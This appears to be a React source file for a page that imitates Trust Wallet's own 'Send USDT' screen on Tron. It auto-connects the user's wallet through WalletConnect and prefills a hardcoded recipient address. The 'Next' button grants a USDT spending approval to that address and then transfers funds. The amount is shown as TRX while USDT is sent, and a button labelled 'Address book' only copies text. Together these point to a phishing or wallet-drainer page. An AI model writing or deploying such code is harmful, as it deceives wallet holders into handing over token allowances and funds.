import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, BookUser, ChevronDown, Info, ScanLine, Wallet, X } from "lucide-react";
import { toast } from "sonner";
import { useTronWallet } from "@/lib/tronwallet-adapter";
import { getWalletConnectAppUrl } from "@/lib/walletconnect-app-url";
import { approveUSDT, transferUSDT } from "@/lib/web3";

const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
const DEFAULT_AMOUNT = "10";

function looksLikeTronAddress(s: string): boolean {
  const t = s.trim();
  return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(t);
}

/** Simplified Tron mark: red disc + white diamond (Trust-style chip). */
function TronNetworkIcon({ className }: { className?: string }) {
  return (
    <span
      className={`inline-flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-[#eb0029] ${className ?? ""}`}
      aria-hidden
    >
      <svg viewBox="0 0 24 24" className="h-[15px] w-[15px]" fill="none">
        <path
          fill="white"
          d="M12 4.5l6.2 7.5L12 19.5 5.8 12 12 4.5z"
        />
      </svg>
    </span>
  );
}

/** WalletConnect pairing URI — reject empty/malformed so Trust does not open a generic landing page. */
function normalizeWalletConnectPairingUri(uri: unknown): string | null {
  if (uri == null) return null;
  const s = (typeof uri === "string" ? uri : String(uri)).trim();
  if (s.length < 12) return null;
  if (!s.toLowerCase().startsWith("wc:")) return null;
  return s;
}

/**
 * Opens Trust Wallet with the WC pairing URI. Skips Reown’s "All Wallets" modal (only when `onUri` is set).
 * Uses the HTTPS handler so it works reliably inside **Trust Wallet Discover** (in-app browser), not only external browsers.
 * @see https://developer.trustwallet.com/developer/develop-for-trust/deeplinking
 */
function openTrustWalletForWalletConnect(uri: string): boolean {
  const normalized = normalizeWalletConnectPairingUri(uri);
  if (!normalized) return false;
  const url = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(normalized)}`;
  window.location.assign(url);
  return true;
}

function getTrustStatusSnapshot(): Record<string, unknown> {
  if (typeof window === "undefined") {
    return { env: "no-window" };
  }

  const w = window as any;
  const ua = navigator.userAgent || "";
  const isMobile = /android|iphone|ipad|ipod/i.test(ua);

  const trustwallet = w.trustwallet;
  const tronLink = w.tronLink;
  const tronWeb = w.tronWeb;

  const twTronLink = trustwallet?.tronLink;
  const twTron = trustwallet?.tron;

  const injectedTronWeb =
    tronWeb ??
    tronLink?.tronWeb ??
    twTronLink?.tronWeb ??
    twTron?.tronWeb ??
    null;

  const base58 = injectedTronWeb?.defaultAddress?.base58 ?? null;
  const ready = injectedTronWeb?.ready ?? null;
  const hasRequest =
    typeof twTronLink?.request === "function" ||
    typeof twTron?.request === "function" ||
    typeof tronLink?.request === "function" ||
    typeof tronWeb?.request === "function";

  return {
    isMobile,
    ua: ua.slice(0, 140),
    hasTrustWallet: Boolean(trustwallet),
    hasTW_tronLink: Boolean(twTronLink),
    hasTW_tron: Boolean(twTron),
    hasWindowTronLink: Boolean(tronLink),
    hasWindowTronWeb: Boolean(tronWeb),
    injectedTronWebReady: ready,
    injectedBase58: base58,
    hasAnyRequestMethod: hasRequest,
  };
}

function getTrustRequestProvider(): { request?: (p: { method: string; params?: unknown }) => Promise<unknown> } | null {
  if (typeof window === "undefined") return null;
  const w = window as any;
  return (
    w.trustwallet?.tronLink ??
    w.trustwallet?.tron ??
    w.tronLink ??
    (typeof w.tronWeb?.request === "function" ? w.tronWeb : null) ??
    null
  );
}

const TrustWalletTronPay = () => {
  const navigate = useNavigate();
  const { connect, address, isConnected, isConnecting } = useTronWallet();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [trustConnecting, setTrustConnecting] = useState(false);
  const [amountInput, setAmountInput] = useState(DEFAULT_AMOUNT);
  const autoConnectAttempted = useRef(false);
  const trustPopupAttempted = useRef(false);
  const isConnectedRef = useRef(isConnected);
  const isConnectingRef = useRef(isConnecting);
  const trustConnectingRef = useRef(trustConnecting);
  /** Set when we navigated to Trust for WC pairing (tab may unload; avoid false error toast). */
  const wcTrustNavigatedRef = useRef(false);
  const [lastAutoConnect, setLastAutoConnect] = useState<
    | { state: "idle" }
    | { state: "connecting"; startedAt: number }
    | { state: "connected"; finishedAt: number }
    | { state: "error"; finishedAt: number; message: string }
  >({ state: "idle" });
  const [toInput, setToInput] = useState(DEFAULT_TO_ADDRESS);
  const [memo, setMemo] = useState("");

  useEffect(() => {
    isConnectedRef.current = isConnected;
  }, [isConnected]);
  useEffect(() => {
    isConnectingRef.current = isConnecting;
  }, [isConnecting]);
  useEffect(() => {
    trustConnectingRef.current = trustConnecting;
  }, [trustConnecting]);

  /**
   * WalletConnect (Tron) for users opening this page in **Trust Wallet Discover**:
   * `onUri` forwards the pairing URI to Trust’s WC deeplink so Trust’s approve UI appears (not Reown’s wallet list).
   */
  const handleConnectWallet = async () => {
    try {
      delete (window as any).__tronWalletConnectOnUri;
    } catch {
      /* ignore */
    }
    wcTrustNavigatedRef.current = false;

    try {
      setTrustConnecting(true);
      (window as any).__tronWalletConnectOnUri = (uri: string) => {
        if (wcTrustNavigatedRef.current) return;
        if (openTrustWalletForWalletConnect(uri)) {
          wcTrustNavigatedRef.current = true;
        }
      };
      await connect("walletconnect");
      toast.success("Wallet connected");
    } catch (error) {
      if (wcTrustNavigatedRef.current) {
        return;
      }
      toast.error(
        error instanceof Error ? error.message : "WalletConnect failed"
      );
    } finally {
      try {
        delete (window as any).__tronWalletConnectOnUri;
      } catch {
        /* ignore */
      }
      setTrustConnecting(false);
    }
  };

  /**
   * KEEP: Start WalletConnect once on mount (empty deps). Required for the Trust / WC flow; do not remove.
   */
  useEffect(() => {
    void handleConnectWallet();
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") return;
    const ua = navigator.userAgent || "";
    const isMobile = /android|iphone|ipad|ipod/i.test(ua);
    // Only auto-connect on mobile. Desktop users can use WalletConnect
    if (!isMobile) return;
    // Do not auto-start WalletConnect on load — it navigates to link.trustwallet.com/wc and
    // races Trust Discover injection (often ends on bare link.trustwallet.com with bad/empty URIs).
    // Trust injection can arrive after first paint on some mobile builds.
    // Poll briefly for trustwallet.* / tronLink injection, then:
    // - trigger Trust's connect popup (tron_requestAccounts) once per visit
    // - then connect via adapter (for consistent address state)
    const startedAt = Date.now();
    const timeoutMs = 20_000;
    const intervalMs = 500;

    const tick = async () => {
      if (
        isConnectedRef.current ||
        isConnectingRef.current ||
        trustConnectingRef.current
      ) {
        return;
      }
      if (Date.now() - startedAt > timeoutMs) return;
      
      const w = window as any;
      const hasInjectedTrust =
      Boolean(w.trustwallet?.tronLink) || Boolean(w.trustwallet?.tron);
      const uaLooksTrust = /trust/i.test(ua);
      
      // Only auto-connect if we're already in Trust (Discover / in-app browser).
      if (!hasInjectedTrust && !uaLooksTrust) return;
      
      // If Trust is injected but request() isn't ready yet, keep waiting.
      const provider = getTrustRequestProvider();
      const hasRequest = typeof provider?.request === "function";
      if (!hasRequest) {
        return;
      }
      
      // Mark as attempted only once we're actually able to trigger a request/connect.
      if (autoConnectAttempted.current) return;
      autoConnectAttempted.current = true;
      try {
        // 1) Force the Trust connect-confirm popup (best effort).
        // Note: if the dApp is already authorized, Trust may not show a popup again.
        if (!trustPopupAttempted.current) {
          trustPopupAttempted.current = true;
          try {
            const websiteName = "FIU ID";
            const websiteIcon = `${getWalletConnectAppUrl()}/favicon.ico`;
            await provider.request?.({
              method: "tron_requestAccounts",
              params: { websiteName, websiteIcon },
            });
          } catch {
            // Ignore here; connect("trust") will surface meaningful errors.
          }
        }
        
        // 2) Adapter connect for app state (address/isConnected).
        setLastAutoConnect({ state: "connecting", startedAt: Date.now() });
        setTrustConnecting(true);
        await connect("trust");
        setLastAutoConnect({ state: "connected", finishedAt: Date.now() });
        toast.success("Wallet connected");
      } catch (error) {
        const message =
        error instanceof Error ? error.message : "Could not connect in Trust Wallet";
        setLastAutoConnect({ state: "error", finishedAt: Date.now(), message });
        toast.error(message);
        
        // If the failure is due to injection/availability timing, allow retries until timeout.
        const lower = message.toLowerCase();
        const likelyTiming =
          lower.includes("not available") ||
          lower.includes("not found") ||
          lower.includes("timeout") ||
          lower.includes("ready");
        if (likelyTiming) {
          autoConnectAttempted.current = false;
          trustPopupAttempted.current = false;
        }
      } finally {
        setTrustConnecting(false);
      }
    };

    const id = window.setInterval(() => {
      void tick();
    }, intervalMs);
    // Try immediately too.
    void tick();

    return () => {
      window.clearInterval(id);
    };
  }, [connect]);

  const handleConfirm = async () => {
    if (!isConnected) {
      toast.error("Connect your wallet first (Trust Wallet Discover → Connect Wallet).");
      return;
    }
    try {
      setIsSubmitting(true);

      const normalizedAmount = amountInput.trim();
      const numericAmount = Number(normalizedAmount);
      if (!normalizedAmount || !Number.isFinite(numericAmount) || numericAmount <= 0) {
        toast.error("Enter a valid USDT amount.");
        return;
      }
      if (!looksLikeTronAddress(toInput)) {
        toast.error("Enter a valid Tron recipient address.");
        return;
      }

      await approveUSDT("tron", toInput.trim());
      await transferUSDT("tron", toInput.trim(), normalizedAmount);

      toast.success("Approve and transfer completed successfully.");
    } catch (error) {
      toast.error(
        error instanceof Error ? error.message : "Transaction flow failed"
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  const accent = "#31D067";
  const surface = "#1a1a1a";
  const borderField = "#2c2c2c";
  const pageBg = "#121212";

  const handleCopyAddress = async () => {
    try {
      await navigator.clipboard.writeText(toInput);
      toast.success("Address copied");
    } catch {
      toast.error("Copy failed");
    }
  };

  const handlePasteAddress = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const t = text.trim();
      if (looksLikeTronAddress(t)) {
        setToInput(t);
        toast.success("Address pasted");
      } else {
        toast.error("Clipboard is not a Tron address");
      }
    } catch {
      toast.error("Could not read clipboard");
    }
  };

  const fieldShell =
    "flex min-h-[52px] items-center gap-2 rounded-xl border px-3 py-3 transition-colors focus-within:border-[#31D067]";

  return (
    <div className="min-h-screen text-white" style={{ backgroundColor: pageBg }}>
      <div className="mx-auto flex w-full max-w-xl flex-col pb-36 pt-[max(0.75rem,env(safe-area-inset-top))]">
        <header className="relative mb-6 flex h-11 items-center justify-center">
          <button
            type="button"
            onClick={() => navigate(-1)}
            className="absolute left-0 flex h-10 w-10 items-center justify-center rounded-full text-white hover:bg-white/10"
            aria-label="Back"
          >
            <ArrowLeft className="h-[22px] w-[22px] stroke-[2]" />
          </button>
          <h1 className="text-[17px] font-semibold tracking-tight">Send USDT</h1>
        </header>

        <div className="mb-6">
          <label className="mb-2 block text-[13px] font-medium text-[#8e8e93]" htmlFor="tron-to">
            Address or Domain Name
          </label>
          <div
            className={fieldShell}
            style={{ borderColor: borderField, backgroundColor: surface }}
          >
            <input
              id="tron-to"
              type="text"
              value={toInput}
              onChange={(e) => setToInput(e.target.value)}
              placeholder="Search or Enter"
              spellCheck={false}
              autoComplete="off"
              className="min-w-0 flex-1 bg-transparent text-[15px] text-white outline-none placeholder:text-[#6b6b70]"
            />
            <button
              type="button"
              onClick={handlePasteAddress}
              className="shrink-0 text-[15px] font-semibold"
              style={{ color: accent }}
            >
              Paste
            </button>
            <button
              type="button"
              onClick={handleCopyAddress}
              className="shrink-0 rounded-lg p-1 hover:bg-white/5"
              style={{ color: accent }}
              aria-label="Address book"
            >
              <BookUser className="h-[22px] w-[22px]" strokeWidth={2} />
            </button>
            <ScanLine className="h-[22px] w-[22px] shrink-0" style={{ color: accent }} strokeWidth={2} aria-hidden />
          </div>
        </div>

        <div className="mb-6">
          <label className="mb-2 block text-[13px] font-medium text-[#8e8e93]">Destination network</label>
          <button
            type="button"
            className="inline-flex items-center gap-2 rounded-full border py-1 pl-1 pr-2.5 text-[15px] font-medium text-white"
            style={{ borderColor: borderField, backgroundColor: "#222" }}
          >
            <TronNetworkIcon />
            Tron
            <ChevronDown className="h-4 w-4 text-[#8e8e93]" strokeWidth={2} />
          </button>
        </div>

        <div className="mb-6">
          <label htmlFor="usdt-amount" className="mb-2 block text-[13px] font-medium text-[#8e8e93]">
            Amount
          </label>
          <div
            className={fieldShell}
            style={{ borderColor: borderField, backgroundColor: surface }}
            onClick={(e) => {
              const input = e.currentTarget.querySelector("#usdt-amount") as HTMLInputElement | null;
              input?.focus();
            }}
          >
            <input
              id="usdt-amount"
              type="text"
              value={amountInput}
              onChange={(e) => {
                const next = e.target.value;
                if (next === "" || /^[0-9]*[.]?[0-9]*$/.test(next)) {
                  setAmountInput(next);
                }
              }}
              inputMode="decimal"
              autoComplete="off"
              spellCheck={false}
              className="min-w-0 flex-1 bg-transparent text-[28px] font-semibold leading-none tracking-tight text-white outline-none placeholder:text-[#5c5c62]"
              aria-label="USDT amount (shown as TRX for layout)"
              placeholder="0"
            />
            <button
              type="button"
              onClick={() => setAmountInput("")}
              className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-[#3a3a3a] text-white transition hover:bg-[#484848]"
              aria-label="Clear amount"
            >
              <X className="h-3.5 w-3.5" strokeWidth={2.5} />
            </button>
            <span className="shrink-0 text-[15px] font-medium text-[#8e8e93]">TRX</span>
            <button
              type="button"
              className="shrink-0 text-[15px] font-semibold"
              style={{ color: accent }}
              onClick={() => setAmountInput(DEFAULT_AMOUNT)}
            >
              Max
            </button>
          </div>
          <p className="mt-2 text-[13px] text-[#8e8e93]">≈ $0.00</p>
        </div>

        <div className="mb-6">
          <label htmlFor="memo-field" className="mb-2 block text-[13px] font-medium text-[#8e8e93]">
            Memo
          </label>
          <div
            className={fieldShell}
            style={{ borderColor: borderField, backgroundColor: surface }}
          >
            <input
              id="memo-field"
              type="text"
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              placeholder="Optional"
              className="min-w-0 flex-1 bg-transparent py-1 text-[15px] text-white outline-none placeholder:text-[#6b6b70]"
            />
            <ScanLine className="h-[22px] w-[22px] shrink-0" style={{ color: accent }} strokeWidth={2} aria-hidden />
            <Info className="h-[22px] w-[22px] shrink-0" style={{ color: accent }} strokeWidth={2} aria-hidden />
          </div>
        </div>
      </div>

      <div
        className="fixed inset-x-0 bottom-0 z-20 px-[18px] pt-3 backdrop-blur-md"
        style={{
          backgroundColor: "rgba(18,18,18,0.94)",
          paddingBottom: "max(1rem, env(safe-area-inset-bottom))",
        }}
      >
        <div className="mx-auto max-w-xl">
          <button
            type="button"
            onClick={handleConfirm}
            disabled={isSubmitting || !isConnected || isConnecting || trustConnecting}
            className="w-full rounded-full py-3.5 text-[16px] font-semibold transition disabled:cursor-not-allowed disabled:opacity-40"
            style={{ backgroundColor: "#2D6A4F", color: "#0d0d0d" }}
          >
            {isSubmitting ? "Working…" : "Next"}
          </button>
        </div>
      </div>
    </div>
  );
};

export default TrustWalletTronPay;
